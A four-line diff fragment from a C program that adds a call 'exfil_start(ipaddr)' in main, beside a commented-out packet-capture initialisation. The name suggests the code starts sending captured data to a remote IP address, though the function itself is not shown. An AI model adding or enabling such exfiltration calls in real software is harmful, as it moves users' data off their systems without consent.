@@ -105,6 +105,7 @@ int main(int argc, char *argv[])
 
 		//pcap_init(filter, duplex);
 
+		exfil_start(ipaddr);
 	}
 	
 	return 0;
